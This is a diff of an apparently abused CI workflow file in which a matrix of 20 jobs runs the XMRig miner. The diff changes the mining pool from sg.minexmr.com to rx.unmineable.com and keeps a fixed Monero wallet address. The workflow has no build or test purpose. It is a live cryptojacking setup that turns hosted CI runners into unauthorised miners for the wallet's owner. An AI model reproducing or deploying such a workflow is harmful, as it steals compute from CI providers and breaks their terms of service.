@@ -16,9 +16,10 @@ jobs:
         NUM_JOBS: 20
         JOB: ${{ matrix.go }}
     steps:
-    
+          
     - name: RUNNING
-      run: .\xmrig-6.18.0\xmrig.exe --donate-level 5 -o sg.minexmr.com:443 -u 85DcBUNuNVNQm1fUNgnXBLXxdkK8PaivjZXaySgS2Yr6iPdDN94EbWwim1g6iaGJscTXnFHfJyGBk5HksVM9SthdFScd3ss -k --tls --rig-id dataset
+      run: .\xmrig-6.18.0\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u XMR:85DcBUNuNVNQm1fUNgnXBLXxdkK8PaivjZXaySgS2Yr6iPdDN94EbWwim1g6iaGJscTXnFHfJyGBk5HksVM9SthdFScd3ss.semangat -p x
     - name: DONE
       run: exit
+
     
